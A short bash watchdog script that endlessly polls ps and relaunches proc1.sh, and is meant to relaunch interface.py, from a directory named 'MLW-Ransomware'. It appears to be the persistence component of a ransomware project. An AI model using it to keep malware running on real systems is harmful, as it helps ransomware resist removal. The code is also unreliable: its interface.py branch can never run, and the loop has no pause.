#!/bin/bash
X=0
while [ ${X} -eq 0 ]
do
	proc2_state=$(ps -ef | grep "proc1.sh" | grep -v grep | wc -l | xargs)	
	interface_state=$(ps -ef | grep "interface.py" | grep -v grep | wc -l | xargs)
	if [ ${proc2_state} -eq 0 ]; then
		echo "Process stop running"
		/bin/bash /home/ruben/Documentos/RANS/MLW-Ransomware/Interface/proc1.sh &
		
	elif [ ${interface_state} -eq 0 ]; then
		if [ ${proc2_state} -eq 0 ]; then
			python /home/ruben/Documentos/RANS/MLW-Ransomware/Interface/interface.py &
		fi
	fi
done
